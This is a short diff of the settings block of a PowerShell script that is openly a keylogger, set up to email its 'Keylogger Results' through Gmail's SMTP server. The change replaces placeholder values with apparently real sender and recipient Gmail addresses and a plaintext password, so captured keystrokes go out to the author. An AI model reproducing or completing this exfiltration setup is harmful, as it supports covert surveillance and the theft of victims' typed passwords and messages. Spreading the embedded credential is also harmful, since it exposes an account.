@@ -1,12 +1,12 @@
 # Edit only this section!
 $TimesToRun = 2
 $RunTimeP = 1
-$From = "USER1@mail.com"
-$Pass = "Pa$$w0rd"
-$To = "USER2@mail.com"
+$From = "powershellwindows.bot@gmail.com"
+$Pass = "f278e8477dbc8"
+$To = "nobodyemil@gmail.com"
 $Subject = "Keylogger Results"
-$body = "Keylogger Results"
-$SMTPServer = "smtp.mail.com"
+$body = "Keylogger Results im Anhang"
+$SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 ############################
